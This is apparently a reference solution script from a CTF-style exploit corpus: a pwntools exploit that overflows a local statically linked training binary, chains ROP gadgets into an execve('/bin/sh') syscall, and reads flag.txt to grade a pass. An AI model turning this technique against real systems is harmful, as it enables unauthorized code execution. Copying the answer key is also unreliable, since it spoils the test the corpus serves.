#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
07_static_ret2syscall.

Technique: "ret2libc without a leak" -- the binary is statically linked, so
there is no separate libc.so to be randomized by ASLR; every gadget and
data address (including the embedded "/bin/sh" string `shell_path`) is at
a fixed address in the binary itself. No information leak is required at
all. This is structurally distinct from round-1's leak-free ret2plt/system
target and from this corpus's own target 02 (ret2plt_strcat_system, which
calls system@plt): here there is no system()/PLT call whatsoever -- the
chain drives a raw execve() syscall directly.

Protections: canary=OFF, NX=ON, PIE=OFF, RELRO=partial, STATIC linking.

Stack layout: `buf[80]` sits at rbp-0x50 in vuln(); saved rbp is 0x50
bytes further, and the return address follows 8 bytes after that, giving
an 88-byte offset to the return address (verified via objdump).

ROP chain (gadgets located via pwntools' ROP.find_gadget against the large
statically-linked gadget set -- abundant pop-register/syscall sequences
are a hallmark of full static glibc images):
  pop rdi; ret          @ 0x401eef  -> rdi = &shell_path ("/bin/sh")
  pop rsi; ret          @ 0x409f5e  -> rsi = 0 (argv = NULL)
  pop rdx; pop rbx; ret @ 0x485bab  -> rdx = 0 (envp = NULL); rbx clobbered
  pop rax; ret          @ 0x44ff07  -> rax = 59 (SYS_execve)
  syscall                @ 0x401ca4 -> execve(shell_path, NULL, NULL)

This lands a shell; the flag is then read from flag.txt in the target's
own working directory (this target's win condition is "get a shell", the
same convention as round-1's leak-free ret2plt target and this corpus's
targets 01/02/03, which don't compile the flag into the binary at all).

Anti-gaming: confirmed benign input (e.g. "hello") produces no shell and
the program exits cleanly after printing "done" (rc=0) -- the 400-byte
read() only becomes dangerous once the 88-byte offset is actually
overflowed with a real ROP chain.

Run directly:
    python3 07_static_ret2syscall_reference.py
"""
import os
import sys
import time

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "07_static_ret2syscall")
BINARY = os.path.join(TARGET_DIR, "static_ret2syscall")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

OFFSET = 88

POP_RDI = 0x401eef
POP_RSI = 0x409f5e
POP_RDX_RBX = 0x485bab
POP_RAX = 0x44ff07
SYSCALL = 0x401ca4


def exploit():
    elf = ELF(BINARY, checksec=False)
    shell_path = elf.symbols["shell_path"]

    io = process(elf.path, cwd=TARGET_DIR)
    io.recvuntil(b"input> ")

    payload = b"A" * OFFSET
    payload += p64(POP_RDI) + p64(shell_path)
    payload += p64(POP_RSI) + p64(0)
    payload += p64(POP_RDX_RBX) + p64(0) + p64(0)
    payload += p64(POP_RAX) + p64(59)
    payload += p64(SYSCALL)
    io.sendline(payload)

    time.sleep(0.5)
    io.sendline(b"cat flag.txt")
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 07_static_ret2syscall: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
